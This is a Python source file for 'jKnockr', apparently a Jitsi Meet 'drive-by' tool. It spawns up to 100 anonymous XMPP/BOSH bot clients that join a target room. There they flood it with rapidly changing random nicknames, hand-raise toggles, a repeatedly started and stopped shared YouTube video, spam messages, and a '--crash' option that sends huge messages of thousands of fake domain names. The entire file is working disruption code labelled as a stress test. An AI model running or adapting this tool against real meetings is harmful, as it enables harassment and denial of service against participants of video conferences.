#!/usr/bin/env python3
# jKnockr (Jitsi Drive-by Script) - Developed by acidvegas in Python (https://git.acid.vegas/jknockr)

import argparse
import http.cookiejar
import random
import re
import socket
import string
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET


def client_join(client_id: int, tlds: list, args: argparse.Namespace, video_id: str) -> None:
	'''Performs the client join process and handles messaging, hand raising, nickname changes, and video sharing.

	:param client_id: The ID of the client (thread number)
	:param tlds: List of TLDs to use for generating messages
	:param args: Parsed command-line arguments
	:param video_id: YouTube video ID to share
	'''
	try:
		print(f'Client {client_id}: Starting')
		cookie_jar = http.cookiejar.CookieJar()
		opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))
		headers = {'Content-Type': 'text/xml; charset=utf-8'}
		rid = random.randint(1000000, 9999999)
		parsed_url = urllib.parse.urlparse(args.target)
		target_domain = parsed_url.hostname
		room_name = parsed_url.path.strip('/')
		if not room_name:
			print(f'Client {client_id}: No room name specified in the target URL.')
			return
		bosh_url = f'https://{target_domain}/http-bind'
		if args.nick:
			if isinstance(args.nick, str) and args.nick is not True:
				base_nick = args.nick
				random_length = 50 - len(base_nick) - 2
				if random_length < 0:
					print(f'Client {client_id}: Nickname is too long.')
					return
				nickname = ''.join(random.choices(string.ascii_letters + string.digits, k=random_length//2)) + '_' + base_nick + '_' + ''.join(random.choices(string.ascii_letters + string.digits, k=random_length - random_length//2))
			else:
				nickname = ''.join(random.choices(string.ascii_letters + string.digits, k=50))
		else:
			nickname = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
		print(f'Client {client_id}: Establishing session')
		body = f'''<body rid='{rid}' to='{target_domain}' xml:lang='en' wait='60' hold='1' xmlns='http://jabber.org/protocol/httpbind'/>'''
		request = urllib.request.Request(bosh_url, data=body.encode('utf-8'), headers=headers, method='POST')
		response = opener.open(request, timeout=10)
		response_text = response.read().decode('utf-8')
		sid = extract_sid(response_text)
		if not sid:
			print(f'Client {client_id}: Failed to obtain session ID.')
			print(f'Client {client_id}: Server response: {response_text}')
			return
		print(f'Client {client_id}: Obtained session ID: {sid}')
		rid += 1
		print(f'Client {client_id}: Sending authentication request')
		auth_body = f'''<body rid='{rid}' sid='{sid}' xmlns='http://jabber.org/protocol/httpbind'>
		  <auth mechanism='ANONYMOUS' xmlns='urn:ietf:params:xml:ns:xmpp-sasl'/>
		</body>'''
		request = urllib.request.Request(bosh_url, data=auth_body.encode('utf-8'), headers=headers, method='POST')
		response = opener.open(request, timeout=10)
		response_text = response.read().decode('utf-8')
		if '<success' in response_text:
			print(f'Client {client_id}: Authentication successful.')
		else:
			print(f'Client {client_id}: Authentication failed.')
			print(f'Client {client_id}: Server response: {response_text}')
			return
		rid += 1
		print(f'Client {client_id}: Restarting stream')
		restart_body = f'''<body rid='{rid}' sid='{sid}' xmlns='http://jabber.org/protocol/httpbind' to='{target_domain}' xml:lang='en' xmpp:restart='true' xmlns:xmpp='urn:xmpp:xbosh'/>'''
		request = urllib.request.Request(bosh_url, data=restart_body.encode('utf-8'), headers=headers, method='POST')
		response = opener.open(request, timeout=10)
		rid += 1
		print(f'Client {client_id}: Binding resource')
		bind_body = f'''<body rid='{rid}' sid='{sid}' xmlns='http://jabber.org/protocol/httpbind'>
		  <iq type='set' id='bind_1' xmlns='jabber:client'>
			<bind xmlns='urn:ietf:params:xml:ns:xmpp-bind'/>
		  </iq>
		</body>'''
		request = urllib.request.Request(bosh_url, data=bind_body.encode('utf-8'), headers=headers, method='POST')
		response = opener.open(request, timeout=10)
		response_text = response.read().decode('utf-8')
		jid = extract_jid(response_text)
		if not jid:
			print(f'Client {client_id}: Failed to bind resource.')
			print(f'Client {client_id}: Server response: {response_text}')
			return
		print(f'Client {client_id}: Bound resource. JID: {jid}')
		rid += 1
		print(f'Client {client_id}: Sending initial presence')
		presence_elements = [
			'<x xmlns=\'http://jabber.org/protocol/muc\'/>',
			f'<nick xmlns=\'http://jabber.org/protocol/nick\'>{nickname}</nick>'
		]
		presence_stanza = ''.join(presence_elements)
		room_jid = f'{room_name}@conference.{target_domain}/{nickname}'
		presence_body = f'''<body rid='{rid}' sid='{sid}' xmlns='http://jabber.org/protocol/httpbind'>
			<presence to='{room_jid}' xmlns='jabber:client'>
			  {presence_stanza}
			</presence>
		  </body>'''
		request = urllib.request.Request(bosh_url, data=presence_body.encode('utf-8'), headers=headers, method='POST')
		response = opener.open(request, timeout=10)
		response_text = response.read().decode('utf-8')
		print(f'Client {client_id}: Server response to initial presence (join room):')
		print(response_text)
		rid += 1
		hand_raised = True
		for i in range(1, 101):
			print(f'Client {client_id}: Starting iteration {i}')
			if args.nick:
				if isinstance(args.nick, str) and args.nick is not True:
					base_nick = args.nick
					random_length = 50 - len(base_nick) - 2
					if random_length < 0:
						print(f'Client {client_id}: Nickname is too long.')
						return
					nickname = ''.join(random.choices(string.ascii_letters + string.digits, k=random_length//2)) + '_' + base_nick + '_' + ''.join(random.choices(string.ascii_letters + string.digits, k=random_length - random_length//2))
				else:
					nickname = ''.join(random.choices(string.ascii_letters + string.digits, k=50))
			presence_elements = []
			presence_elements.append(f'<nick xmlns=\'http://jabber.org/protocol/nick\'>{nickname}</nick>')
			if args.hand:
				timestamp = int(time.time() * 1000)
				if hand_raised:
					presence_elements.append(f'<jitsi_participant_raisedHand>{timestamp}</jitsi_participant_raisedHand>')
				hand_raised = not hand_raised
			if args.youtube and video_id:
				video_state = 'start' if i % 2 == 1 else 'stop'
				presence_elements.append(f'<shared-video from=\'{jid}\' state=\'{video_state}\' time=\'0\'>{video_id}</shared-video>')
			if args.nick or args.hand or args.youtube:
				presence_stanza = ''.join(presence_elements)
				room_jid = f'{room_name}@conference.{target_domain}/{nickname}'
				presence_body = f'''<body rid='{rid}' sid='{sid}' xmlns='http://jabber.org/protocol/httpbind'>
					<presence to='{room_jid}' xmlns='jabber:client'>
					  {presence_stanza}
					</presence>
				  </body>'''
				request = urllib.request.Request(bosh_url, data=presence_body.encode('utf-8'), headers=headers, method='POST')
				response = opener.open(request, timeout=10)
				response_text = response.read().decode('utf-8')
				print(f'Client {client_id}: Server response to presence update:')
				print(response_text)
				rid += 1
			if args.crash or args.message:
				if args.crash:
					if not tlds:
						print(f'Client {client_id}: TLD list is empty. Using default TLDs.')
						tlds = ['com', 'net', 'org', 'info', 'io']
					msg = ' '.join( f'{random_word(2)}@{random_word(2)}.{random.choice(tlds)}' if random.choice([True,False]) else f'{random_word(4)}.{random.choice(tlds)}' for _ in range(2500))
				elif args.message:
					msg = args.message
				message_body = f'''<body rid='{rid}' sid='{sid}' xmlns='http://jabber.org/protocol/httpbind'>
					<message to='{room_name}@conference.{target_domain}' type='groupchat' xmlns='jabber:client'>
						<body>{msg}</body>
					</message>
				  </body>'''
				request = urllib.request.Request(bosh_url, data=message_body.encode('utf-8'), headers=headers, method='POST')
				response = opener.open(request, timeout=10)
				response_text = response.read().decode('utf-8')
				print(f'Client {client_id}: Server response to message {i}:')
				print(response_text)
				rid += 1
		print(f'Client {client_id}: Finished')
	except Exception as e:
		print(f'Client {client_id}: Exception occurred: {e}')


def extract_jid(response_text: str) -> str:
	'''Extracts the JID from the XML response.

	:param response_text: The XML response text from which to extract the JID
	'''
	try:
		root = ET.fromstring(response_text)
		for elem in root.iter():
			if 'jid' in elem.tag:
				return elem.text
		return None
	except ET.ParseError:
		return None


def extract_sid(response_text: str) -> str:
	'''Extracts the SID from the XML response.

	:param response_text: The XML response text from which to extract the SID
	'''
	try:
		root = ET.fromstring(response_text)
		return root.attrib.get('sid')
	except ET.ParseError:
		return None


def force_ipv4() -> None:
	'''Forces the use of IPv4 by monkey-patching socket.getaddrinfo.'''
	socket._original_getaddrinfo = socket.getaddrinfo
	def getaddrinfo_ipv4_only(host, port, family=0, type=0, proto=0, flags=0):
		return socket._original_getaddrinfo(host, port, socket.AF_INET, type, proto, flags)
	socket.getaddrinfo = getaddrinfo_ipv4_only


def main() -> None:
	'''Main function to start threads and execute the stress test.'''
	parser = argparse.ArgumentParser(description='Stress test a Jitsi Meet server.')
	parser.add_argument('target', help='Target room URL (e.g., https://meet.jit.si/roomname)')
	parser.add_argument('--crash', action='store_true', help='Enable crash (send large messages with random TLDs)')
	parser.add_argument('--message', type=str, help='Send a custom message')
	parser.add_argument('--hand', action='store_true', help='Enable hand raising')
	parser.add_argument('--nick', nargs='?', const=True, help='Enable nickname changes. Optionally provide a nickname')
	parser.add_argument('--youtube', type=str, help='Share a YouTube video (provide URL)')
	parser.add_argument('--threads', type=int, default=100, help='Number of threads (clients) to use')
	args = parser.parse_args()
	tlds = []
	if args.crash:
		print('Fetching TLDs')
		try:
			tlds_url = 'https://data.iana.org/TLD/tlds-alpha-by-domain.txt'
			request = urllib.request.Request(tlds_url)
			with urllib.request.urlopen(request, timeout=10) as response:
				response_text = response.read().decode('utf-8')
				tlds = [line.lower() for line in response_text.splitlines() if not line.startswith('#')]
				print(f'Number of TLDs fetched: {len(tlds)}')
				if not tlds:
					print('TLD list is empty after fetching. Using default TLDs.')
					tlds = ['com', 'net', 'org', 'info', 'io']
		except Exception as e:
			print(f'Failed to fetch TLDs: {e}')
			print('Using default TLDs.')
			tlds = ['com', 'net', 'org', 'info', 'io']
	video_id = None
	if args.youtube:
		youtube_url = args.youtube
		video_id_match = re.search(r'(?:v=|\/)([0-9A-Za-z_-]{11}).*', youtube_url)
		if video_id_match:
			video_id = video_id_match.group(1)
			print(f'Parsed YouTube video ID: {video_id}')
		else:
			print('Invalid YouTube URL provided.')
			return
	threads = []
	for i in range(args.threads):
		t = threading.Thread(target=client_join, args=(i, tlds, args, video_id))
		threads.append(t)
		t.start()
	for t in threads:
		t.join()


def random_word(length: int) -> str:
	'''Generates a random word of a given length.

	:param length: The length of the word to generate
	'''
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for _ in range(length))


if __name__ == '__main__':
	force_ipv4()
	main()
